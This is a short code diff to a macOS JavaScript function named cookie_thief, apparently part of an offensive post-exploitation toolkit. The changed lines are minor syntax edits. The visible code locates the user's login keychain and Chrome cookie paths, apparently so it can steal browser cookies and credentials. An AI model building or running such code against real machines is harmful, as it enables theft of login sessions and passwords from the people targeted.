@@ -1,7 +1,7 @@
 exports.cookie_thief = function(task, command, params){
     let config = JSON.parse(params);
     let password = "";
-    let username = "";
+    var username = "";
     let browser = "chrome";
     let homedir = "/Users/";
     let keychainpath = "Library/Keychains/login.keychain-db"
@@ -19,7 +19,7 @@ exports.cookie_thief = function(task, command, params){
         username = config['username'];
     }
     else {
-        username = ObjC.unwrap($.NSUserName());
+        username = $.NSUserName().js;
     }
     cookiepath = homedir + username + "/";
 
